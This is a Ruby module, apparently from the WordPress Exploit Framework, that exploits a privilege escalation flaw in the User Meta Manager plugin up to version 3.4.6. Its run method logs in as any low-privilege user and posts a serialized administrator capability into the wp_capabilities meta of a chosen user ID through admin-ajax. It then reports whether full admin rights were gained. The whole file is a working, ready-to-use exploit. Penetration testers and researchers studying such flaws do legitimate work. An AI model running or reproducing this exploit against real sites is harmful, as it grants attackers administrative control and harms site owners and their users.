class Wpxf::Auxiliary::UserMetaManagerPrivilegeEscalation < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'User Meta Manager <= 3.4.6 Privilege Escalation',
      desc: 'The User Meta Manager plugin, up to and including version '\
            '3.4.6, allows authenticated users of any level to update the '\
            'role of any user to be an administrator.',
      author: [
        'Panagiotis Vagenas',              # Vulnerability discovery
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['URL', 'http://seclists.org/bugtraq/2016/Feb/34'],
        ['WPVDB', '8379']
      ],
      date: 'Feb 04 2016'
    )

    register_options([
      Wpxf::Options::IntegerOption.new(
        name: 'user_id',
        desc: 'The ID of the user to make an admin',
        required: true
      ),
      Wpxf::Options::StringOption.new(
        name: 'username',
        desc: 'The username to register with',
        default: Utility::Text.rand_alpha(10)
      ),
      Wpxf::Options::StringOption.new(
        name: 'password',
        desc: 'The password to register with',
        default: Utility::Text.rand_alpha(rand(10..20))
      )
    ])
  end

  def username
    normalized_option_value('username')
  end

  def password
    normalized_option_value('password')
  end

  def user_id
    normalized_option_value('user_id')
  end

  def check
    check_plugin_version_from_readme('user-meta-manager', '3.4.7')
  end

  def run
    return false unless super

    cookie = authenticate_with_wordpress(username, password)
    return false unless cookie

    res = execute_post_request(
      url: wordpress_url_admin_ajax,
      params: {
        'action' => 'umm_switch_action',
        'umm_sub_action' => 'umm_update_user_meta',
        'umm_user' => user_id.to_s
      },
      body: {
        'mode' => 'edit',
        'umm_meta_value[]' => 'a:1:{s:13:"administrator";b:1;}',
        'umm_meta_key[]' => 'wp_capabilities'
      },
      cookie: cookie
    )

    if res.code == 200 && res.body =~ /Meta data successfully updated/i
      emit_success "User #{user_id} now has full admin rights"
      return true
    else
      emit_error "Response code: #{res.code}", true
      emit_error "Response body: #{res.body}", true
      emit_error 'Failed to escalate privileges'
      return false
    end
  end
end
